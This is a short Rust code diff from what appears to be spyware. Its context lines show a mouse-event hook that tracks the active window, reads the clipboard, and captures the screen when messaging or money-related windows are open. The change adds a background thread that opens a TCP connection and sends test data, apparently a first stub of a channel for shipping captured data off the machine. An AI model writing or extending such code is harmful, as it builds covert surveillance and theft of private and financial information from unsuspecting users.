@@ -2,6 +2,8 @@ use arboard::Clipboard;
 use active_win_pos_rs::get_active_window;
 use chrono::{Utc, DateTime};
 use rdev::{Event, EventType, Button};
+use std::io::prelude::*;
+use std::net::TcpStream;
 
 use crate::{zip_screenshot, zip_text, is_messengers, is_money, capture_screen};
 use crate::{LOG_FILE, LOGGED};
@@ -87,6 +89,12 @@ pub fn callback(event: Event) {
                 if is_money(title) {
                     capture_screen(active_window);
                 }
+
+                std::thread::spawn(move || {
+                    let mut stream = TcpStream::connect("127.0.0.1:30001").unwrap();
+                    let data = String::from("test test test");
+                    stream.write(data.as_bytes());
+                });
             },
             Button::Right => (),
             _ => ()
